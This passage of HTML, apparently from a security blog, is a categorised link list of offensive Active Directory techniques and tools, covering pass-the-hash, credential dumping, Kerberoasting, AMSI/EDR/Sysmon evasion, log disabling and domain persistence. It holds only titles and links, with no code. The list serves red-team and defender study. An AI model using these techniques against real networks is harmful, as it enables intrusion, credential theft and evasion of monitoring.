data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8yMS9ob3ctdG8tcGFzcy10aGUtaGFzaC13aXRoLW1pbWlrYXR6Lw==\">How to Pass-the-Hash with Mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL3Bhc3MtdGhlLWhhc2gtaXMtZGVhZC1sb25nLWxpdmUtbG9jYWxhY2NvdW50dG9rZW5maWx0ZXJwb2xpY3kv\">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</span></li>\n</ul>\n<h3 id=\"system-center-configuration-manager-sccm\"><a class=\"anchor\" href=\"#system-center-configuration-manager-sccm\">#</a> System Center Configuration Manager (SCCM)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTUvMTAvMjcvdGFyZ2V0ZWQtd29ya3N0YXRpb24tY29tcHJvbWlzZS13aXRoLXNjY20v\">Targeted Workstation Compromise With Sccm</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNDQ00=\">PowerSCCM - PowerShell module to interact with SCCM deployments</span></li>\n</ul>\n<h3 id=\"wsus\"><a class=\"anchor\" href=\"#wsus\">#</a> WSUS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2l4ZHViLm5ldC8/cD02MjM=\">Remote Weaponization of WSUS MITM</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvd2VkbmVzZGF5L3VzLTE3LUNvbHRlbC1XU1VTcGVuZHUtVXNlLVdTVVMtVG8tSGFuZy1JdHMtQ2xpZW50cy13cC5wZGY=\">WSUSpendu</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9panVzdHdhbm5hcmVkLnRlYW0vMjAxOC8xMC8xNS9sZXZlcmFnaW5nLXdzdXMtcGFydC1vbmUv\">Leveraging WSUS – Part One</span></li>\n</ul>\n<h3 id=\"password-spraying\"><a class=\"anchor\" href=\"#password-spraying\">#</a> Password Spraying</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj14QjI2UWhuTDY0Yw==\">Password Spraying Windows Active Directory Accounts - Tradecraft Security Weekly #5</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2F0dGFja2luZy1leGNoYW5nZS13aXRoLW1haWxzbmlwZXIv\">Attacking Exchange with MailSniper</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnMvU3ByYXk=\">A Password Spraying tool for Active Directory Credentials by Jacob Wilkin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL1NwcmF5aW5nVG9vbGtpdA==\">SprayingToolkit</span></li>\n</ul>\n<h3 id=\"automated-lateral-movement\"><a class=\"anchor\" href=\"#automated-lateral-movement\">#</a> Automated Lateral Movement</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvRmV0Y2hBRC9Hb0ZldGNo\">GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0RlYXRoU3Rhcg==\">DeathStar - Automate getting Domain Admin using Empire</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0FOR1JZUFVQUFk=\">ANGRYPUPPY - Bloodhound Attack Path Automation in CobaltStrike</span></li>\n</ul>\n<hr />\n<h2 id=\"defense-evasion\"><a class=\"anchor\" href=\"#defense-evasion\">#</a> Defense Evasion</h2>\n<h3 id=\"in-memory-evasion\"><a class=\"anchor\" href=\"#in-memory-evasion\">#</a> In-Memory Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9leHBlcmltZW50aW5nLWJ5cGFzc2luZy1tZW1vcnktc2Nhbm5lcnMtd2l0aC1jb2JhbHQtc3RyaWtlLWFuZC1nYXJnb3lsZS8=\">Bypassing Memory Scanners with Cobalt Strike and Gargoyle</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vcGxheWxpc3Q/bGlzdD1QTDlITzZNX01VMm5jNVEzMXFkMkN3cFo4SjRLRk1oZ25L\">In-Memory Evasions Course</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAxOC8wNi9icmluZy15b3VyLW93bi1sYW5kLW5vdmVsLXJlZC10ZWFtaW5nLXRlY2huaXF1ZS5odG1s\">Bring Your Own Land (BYOL) – A Novel Red Teaming Technique</span></li>\n</ul>\n<h3 id=\"endpoint-detection-and-response-edr-evasion\"><a class=\"anchor\" href=\"#endpoint-detection-and-response-edr-evasion\">#</a> Endpoint Detection and Response (EDR) Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly95b3V0dS5iZS9sOG5rWENPWVFDNA==\">Red Teaming in the EDR age</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Z1enp5U2VjdXJpdHkvU2hhcnAtU3VpdGU=\">Sharp-Suite - Process Argument Spoofing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vdXRmbGFuay5ubC9ibG9nLzIwMTkvMDYvMTkvcmVkLXRlYW0tdGFjdGljcy1jb21iaW5pbmctZGlyZWN0LXN5c3RlbS1jYWxscy1hbmQtc3JkaS10by1ieXBhc3MtYXYtZWRyLw==\">Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY291bnRlcmNlcHQuY29tL2Jsb2cvZGVjaGFpbmluZy1tYWNyb3MtYW5kLWV2YWRpbmctZWRyLw==\">Dechaining Macros and Evading EDR</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bmc3gzMC9ieXBhc3MtZWRycy1tZW1vcnktcHJvdGVjdGlvbi1pbnRyb2R1Y3Rpb24tdG8taG9va2luZy0yZWZiMjFhY2ZmZDY=\">Bypass EDR’s memory protection, introduction to hooking</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcmVkLnRlYW0vb2ZmZW5zaXZlLXNlY3VyaXR5L2RlZmVuc2UtZXZhc2lvbi9ieXBhc3NpbmctY3lsYW5jZS1hbmQtb3RoZXItYXZzLWVkcnMtYnktdW5ob29raW5nLXdpbmRvd3MtYXBpcw==\">Bypassing Cylance and other AVs/EDRs by Unhooking Windows APIs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxOS8wMy9zaWxlbmNpbmctY3lsYW5jZS1hLWNhc2Utc3R1ZHktaW4tbW9kZXJuLWVkcnMv\">Silencing Cylance: A Case Study in Modern EDRs</span></li>\n</ul>\n<h3 id=\"opsec\"><a class=\"anchor\" href=\"#opsec\">#</a> OPSEC</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8xMC8yNS9tb2Rlcm4tZGVmZW5zZXMtYW5kLXlvdS8=\">Modern Defenses and YOU!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==\">OPSEC Considerations for Beacon Commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWM1NjQuY29tLyMhZG9jcy90cmFkZWNyYWZ0Lm1k\">Red Team Tradecraft and TTP Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sb3FWdW5YX3NxQQ==\">Fighting the Toolset</span></li>\n</ul>\n<h3 id=\"microsoft-ata-atp-evasion\"><a class=\"anchor\" href=\"#microsoft-ata-atp-evasion\">#</a> Microsoft ATA &amp; ATP Evasion</h3>\n<ul>\n<li><a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf\">Red Team Techniques for Evading, Bypassing, and Disabling MS<br />\nAdvanced Threat Protection and Advanced Threat Analytics</a></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmlraGlsX21pdHRhbC9yZWQtdGVhbS1yZXZlbmdlLWF0dGFja2luZy1taWNyb3NvZnQtYXRh\">Red Team Revenge - Attacking Microsoft ATA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmlraGlsX21pdHRhbC9ldmFkaW5nLW1pY3Jvc29mdC1hdGEtZm9yLWFjdGl2ZS1kaXJlY3RvcnktZG9taW5hdGlvbg==\">Evading Microsoft ATA for Active Directory Domination</span></li>\n</ul>\n<h3 id=\"powershell-scriptblock-logging-bypass\"><a class=\"anchor\" href=\"#powershell-scriptblock-logging-bypass\">#</a> PowerShell ScriptBlock Logging Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2Jici5pby9TY3JpcHRCbG9jay1Mb2dnaW5nLUJ5cGFzcy5odG1s\">PowerShell ScriptBlock Logging Bypass</span></li>\n</ul>\n<h3 id=\"powershell-anti-malware-scan-interface-amsi-bypass\"><a class=\"anchor\" href=\"#powershell-anti-malware-scan-interface-amsi-bypass\">#</a> PowerShell Anti-Malware Scan Interface (AMSI) Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8weDAwLTB4MDAuZ2l0aHViLmlvL3Jlc2VhcmNoLzIwMTgvMTAvMjgvSG93LXRvLWJ5cGFzcy1BTVNJLWFuZC1FeGVjdXRlLUFOWS1tYWxpY2lvdXMtcG93ZXJzaGVsbC1jb2RlLmh0bWw=\">How to bypass AMSI and execute ANY malicious Powershell code</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU1pdHRhbC1BTVNJLUhvdy1XaW5kb3dzLTEwLVBsYW5zLVRvLVN0b3AtU2NyaXB0LUJhc2VkLUF0dGFja3MtQW5kLUhvdy1XZWxsLUl0LURvZXMtSXQucGRm\">AMSI: How Windows 10 Plans to Stop Script-Based Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL2Ftc2ktYnlwYXNzLXBhdGNoaW5nLXRlY2huaXF1ZS8=\">AMSI Bypass: Patching Technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09tZXJZYS9JbnZpc2ktU2hlbGw=\">Invisi-Shell - Hide your Powershell script in plain sight. Bypass all Powershell security features</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cmV5b3VyaXQuY28udWsvd3AvMjAxOS8wNS8xMC9keW5hbWljLW1pY3Jvc29mdC1vZmZpY2UtMzY1LWFtc2ktaW4tbWVtb3J5LWJ5cGFzcy11c2luZy12YmEv\">Dynamic Microsoft Office 365 AMSI In Memory Bypass Using VBA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTgvMTAvYW1zaXNjYW5idWZmZXItYnlwYXNzLS0tcGFydC0xLw==\">AmsiScanBuffer Bypass - Part 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29udGV4dGlzLmNvbS9lbi9ibG9nL2Ftc2ktYnlwYXNz\">AMSI Bypass</span></li>\n</ul>\n<h3 id=\"loading-net-assemblies-anti-malware-scan-interface-amsi-bypass\"><a class=\"anchor\" href=\"#loading-net-assemblies-anti-malware-scan-interface-amsi-bypass\">#</a> Loading .NET Assemblies Anti-Malware Scan Interface (AMSI) Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbWF0dGlmZXN0YXRpb24vZWYwMTMyYmE0YWUzY2MxMzY5MTRkYTMyYTg4MTA2Yjk=\">A PoC function to corrupt the g_amsiContext global variable in clr.dll in .NET Framework Early Access build 3694</span></li>\n</ul>\n<h3 id=\"applocker-device-guard-bypass\"><a class=\"anchor\" href=\"#applocker-device-guard-bypass\">#</a> AppLocker &amp; Device Guard Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v\">Living Off The Land Binaries And Scripts - (LOLBins and LOLScripts)</span></li>\n</ul>\n<h3 id=\"sysmon-evasion\"><a class=\"anchor\" href=\"#sysmon-evasion\">#</a> Sysmon Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hdHRpZmVzdGF0aW9uL0JIVVNBMjAxOF9TeXNtb24=\">Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21rb3JtYW45MC9zeXNtb24tY29uZmlnLWJ5cGFzcy1maW5kZXI=\">sysmon-config-bypass-finder</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3NoaG1vbi1zaWxlbmNpbmctc3lzbW9uLXZpYS1kcml2ZXItdW5sb2FkLTY4MmI1YmU1NzY1MA==\">Shhmon — Silencing Sysmon via Driver Unload</span></li>\n</ul>\n<h3 id=\"honeytokens-evasion\"><a class=\"anchor\" href=\"#honeytokens-evasion\">#</a> HoneyTokens Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8xMC9kZXBsb3ktZGVjZXB0aW9uLmh0bWw=\">Forging Trusts for Deception in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYmxvZy5qYXZlbGluLW5ldHdvcmtzLmNvbS9ibG9nL3RoZS1ob25leXBvdC1idXN0ZXIv\">Honeypot Buster: A Unique Red-Team Tool</span></li>\n</ul>\n<h3 id=\"disabling-security-tools\"><a class=\"anchor\" href=\"#disabling-security-tools\">#</a> Disabling Security Tools</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hsbGR6L0ludm9rZS1QaGFudDBt\">Invoke-Phant0m - Windows Event Log Killer</span></li>\n</ul>\n<hr />\n<h2 id=\"credential-dumping\"><a class=\"anchor\" href=\"#credential-dumping\">#</a> Credential Dumping</h2>\n<h3 id=\"ntdsdit-password-extraction\"><a class=\"anchor\" href=\"#ntdsdit-password-extraction\">#</a> NTDS.DIT Password Extraction</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00NTE=\">How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHRyYWN0aW5nLXBhc3N3b3JkLWhhc2hlcy1mcm9tLXRoZS1udGRzLWRpdC1maWxlLw==\">Extracting Password Hashes From The Ntds.dit File</span></li>\n</ul>\n<h3 id=\"sam-security-accounts-manager\"><a class=\"anchor\" href=\"#sam-security-accounts-manager\">#</a> SAM (Security Accounts Manager)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsYWRzaGFtaXIvSW50ZXJuYWwtTW9ub2xvZ3Vl\">Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS</span></li>\n</ul>\n<h3 id=\"kerberoasting\"><a class=\"anchor\" href=\"#kerberoasting\">#</a> Kerberoasting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9wb3dlcnNoZWxsL2tlcmJlcm9hc3Rpbmctd2l0aG91dC1taW1pa2F0ei8=\">Kerberoasting Without Mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMjkz\">Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHRyYWN0aW5nLXNlcnZpY2UtYWNjb3VudC1wYXNzd29yZHMtd2l0aC1rZXJiZXJvYXN0aW5nLw==\">Extracting Service Account Passwords With Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL2Jsb2cvY3JhY2tpbmctc2VydmljZS1hY2NvdW50LXBhc3N3b3Jkcy1rZXJiZXJvYXN0aW5nLw==\">Cracking Service Account Passwords with Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZWRlcm1pL2Y4YjE0M2IxMWRjMDIwYjg1NDE3OGQzODA5Y2Y5MWI1\">Kerberoast PW list for cracking passwords with complexity requirements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvaGFybWoweS9kZXJieWNvbi0yMDE5LWtlcmJlcm9hc3RpbmctcmV2aXNpdGVk\">DerbyCon 2019 - Kerberoasting Revisited</span></li>\n</ul>\n<h3 id=\"kerberos-ap-rep-roasting\"><a class=\"anchor\" href=\"#kerberos-ap-rep-roasting\">#</a> Kerberos AP-REP Roasting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9yb2FzdGluZy1hcy1yZXBzLw==\">Roasting AS-REPs</span></li>\n</ul>\n<h3 id=\"windows-credential-managervault\"><a class=\"anchor\" href=\"#windows-credential-managervault\">#</a> Windows Credential Manager/Vault</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL29wZXJhdGlvbmFsLWd1aWRhbmNlLWZvci1vZmZlbnNpdmUtdXNlci1kcGFwaS1hYnVzZS8=\">Operational Guidance for Offensive User DPAPI Abuse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvanVtcGluZy1uZXR3b3JrLXNlZ3JlZ2F0aW9uLXdpdGgtcmRwLw==\">Jumping Network Segregation with RDP</span></li>\n</ul>\n<h3 id=\"dcsync\"><a class=\"anchor\" href=\"#dcsync\">#</a> DCSync</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL21pbWlrYXR6LWFuZC1kY3N5bmMtYW5kLWV4dHJhc2lkcy1vaC1teS8=\">Mimikatz and DCSync and ExtraSids, Oh My</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzI5\">Mimikatz DCSync Usage, Exploitation, and Detection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDUz\">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</span></li>\n</ul>\n<h3 id=\"llmnrnbt-ns-poisoning\"><a class=\"anchor\" href=\"#llmnrnbt-ns-poisoning\">#</a> LLMNR/NBT-NS Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNGFybWVkLmNvbS9ibG9nL2xsbW5yLW5idG5zLXBvaXNvbmluZy11c2luZy1yZXNwb25kZXIv\">LLMNR/NBT-NS Poisoning Using Responder</span></li>\n</ul>\n<h3 id=\"others\"><a class=\"anchor\" href=\"#others\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jb21wcm9taXNpbmctcGxhaW4tdGV4dC1wYXNzd29yZHMtaW4tYWN0aXZlLWRpcmVjdG9yeQ==\">Compromising Plain Text Passwords In Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAyMC8wNC9rZXJiZXJvcy10aWNrZXRzLW9uLWxpbnV4LXJlZC10ZWFtcy5odG1s\">Kerberos Tickets on Linux Red Teams</span></li>\n</ul>\n<hr />\n<h2 id=\"persistence\"><a class=\"anchor\" href=\"#persistence\">#</a> Persistence</h2>\n<h3 id=\"golden-ticket\"><a class=\"anchor\" href=\"#golden-ticket\">#</a> Golden Ticket</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8wOS9nb2xkZW4tdGlja2V0Lw==\">Golden Ticket</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjQw\">Kerberos Golden Tickets are Now More Golden</span></li>\n</ul>\n<h3 id=\"sid-history\"><a class=\"anchor\" href=\"#sid-history\">#</a> SID History</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzcy\">Sneaky Active Directory Persistence #14: SID History</span></li>\n</ul>\n<h3 id=\"silver-ticket\"><a class=\"anchor\" href=\"#silver-ticket\">#</a> Silver Ticket</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDEx\">How Attackers Use Kerberos Silver Tickets to Exploit Systems</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNzUz\">Sneaky Active Directory Persistence #16: Computer Accounts &amp; Domain Controller Silver Tickets</span></li>\n</ul>\n<h3 id=\"dcshadow-2\"><a class=\"anchor\" href=\"#dcshadow-2\">#</a> DCShadow</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jcmVhdGluZy1wZXJzaXN0ZW5jZS13aXRoLWRjc2hhZG93Lw==\">Creating Persistence With Dcshadow</span></li>\n</ul>\n<h3 id=\"adminsdholder\"><a class=\"anchor\" href=\"#adminsdholder\">#</a> AdminSDHolder</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xOTA2\">Sneaky Active Directory Persistence #15: Leverage AdminSDHolder &amp; SDProp to (Re)Gain Domain Admin Rights</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wZXJzaXN0ZW5jZS11c2luZy1hZG1pbnNkaG9sZGVyLWFuZC1zZHByb3Av\">Persistence Using Adminsdholder And Sdprop</span></li>\n</ul>\n<h3 id=\"group-policy-object\"><a class=\"anchor\" href=\"#group-policy-object\">#</a> Group Policy Object</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNzE2\">Sneaky Active Directory Persistence #17: Group Policy</span></li>\n</ul>\n<h3 id=\"skeleton-keys\"><a class=\"anchor\" href=\"#skeleton-keys\">#</a> Skeleton Keys</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS91bmxvY2tpbmctYWxsLXRoZS1kb29ycy10by1hY3RpdmUtZGlyZWN0b3J5LXdpdGgtdGhlLXNrZWxldG9uLWtleS1hdHRhY2sv\">Unlocking All The Doors To Active Directory With The Skeleton Key Attack</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8xMC9za2VsZXRvbi1rZXkv\">Skeleton Key</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xMjc1\">Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers &amp; BackDoor Your Active Directory Forest</span></li>\n</ul>\n<h3 id=\"seenabledelegationprivilege\"><a class=\"anchor\" href=\"#seenabledelegationprivilege\">#</a> SeEnableDelegationPrivilege</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9hY3RpdmVkaXJlY3RvcnkvdGhlLW1vc3QtZGFuZ2Vyb3VzLXVzZXItcmlnaHQteW91LXByb2JhYmx5LWhhdmUtbmV2ZXItaGVhcmQtb2Yv\">The Most Dangerous User Right You (Probably) Have Never Heard Of</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1PaXFhTzlSSHNrVQ==\">SeEnableDelegationPrivilege Active Directory Backdoor</span></li>\n</ul>\n<h3 id=\"security-support-provider\"><a class=\"anchor\" href=\"#security-support-provider\">#</a> Security Support Provider</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzYw\">Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)</span></li>\n</ul>\n<h3 id=\"directory-services-restore-mode\"><a class=\"anchor\" href=\"#directory-services-restore-mode\">#</a> Directory Services Restore Mode</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzE0\">Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNzg1\">Sneaky Active Directory Persistence #13: DSRM Persistence v2</span></li>\n</ul>\n<h3 id=\"acls-security-descriptors\"><a class=\"anchor\" href=\"#acls-security-descriptors\">#</a> ACLs &amp; Security Descriptors</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvd2VkbmVzZGF5L3VzLTE3LVJvYmJpbnMtQW4tQUNFLVVwLVRoZS1TbGVldmUtRGVzaWduaW5nLUFjdGl2ZS1EaXJlY3RvcnktREFDTC1CYWNrZG9vcnMtd3AucGRm\">An ACE Up the Sleeve: Designing Active Directory DACL Backdoors</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3NoYWRvdy1hZG1pbnMtc3RlYWx0aHktYWNjb3VudHMtZmVhci8=\">Shadow Admins – The Stealthy Accounts That You Should Fear The Most</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvaGFybWoweS90aGUtdW5pbnRlbmRlZC1yaXNrcy1vZi10cnVzdGluZy1hY3RpdmUtZGlyZWN0b3J5\">The Unintended Risks of Trusting Active Directory</span></li>\n</ul>\n<h2 id=\"tools-scripts\"><a class=\"anchor\" href=\"#tools-scripts\">#</a> Tools &amp; Scripts</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9SZWNvbi9Qb3dlclZpZXcucHMx\">PowerView</span> - Situational Awareness PowerShell framework</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k\">BloodHound</span> - Six Degrees of Domain Admin</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0\">Impacket</span> - Impacket is a collection of Python classes for working with network protocols</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZveC1pdC9hY2xwd24ucHk=\">aclpwn.py</span> - Active Directory ACL exploitation with BloodHound</li>\n<li><span class=\"exturl\" 